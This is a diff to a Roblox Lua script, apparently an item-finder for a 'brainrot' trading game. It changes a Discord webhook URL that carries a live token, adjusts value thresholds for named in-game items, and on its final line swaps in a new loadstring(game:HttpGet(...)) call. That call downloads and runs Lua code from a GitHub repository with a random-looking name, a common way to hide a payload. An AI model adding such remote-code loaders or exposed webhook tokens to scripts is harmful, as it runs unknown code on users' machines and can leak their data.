@@ -84,7 +84,7 @@ sendTeleport = false,
 showJoinerAd = true
 },
 { -- Special brainrots + overpay
-url = 'https://discord.com/api/webhooks/1457015322119897133/kQkqA4AMYLVviEYFT7Rf4Udz6ATSRYPVcPeDtALzHFfveew7jmjGCPE6Q-5KAZViCaIE',
+url = 'https://discord.com/api/webhooks/1456411952074195051/bdZLaeKaRFCMy3HQOj50RsTq8nn1z18PBkyj_-iKfy1AZ7YK7gvst_Z-yv-lgJfKzOm3',
 title = '⭐️ SPECIAL BRAINROTS',
 color = 0xff00ff,
 special = true,
@@ -101,10 +101,10 @@ local SPECIAL_BRAINROTS = {
 ['Ketupat Kepat'] = 315_000_000,
 ['Strawberry Elephant'] = 0,
 ['Ketchuru and Musturu'] = 255_000_000,
-['Tralaledon'] = 0,
+['Tralaledon'] = 100_000_000,
 ['Tictac Sahur'] = 250_000_000,
 ['Burguro And Fryuro'] = 0,
-['La Secret Combinasion'] = 155_000_000,
+['La Secret Combinasion'] = 0,
 ['Spooky and Pumpky'] = 0,
 ['Meowl'] = 0,
 ['La Casa Boo'] = 0,
@@ -809,4 +809,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ivasdfwfe/wdfesdfaa/refs/heads/main/sdfsdfsdfsdfe1"))()
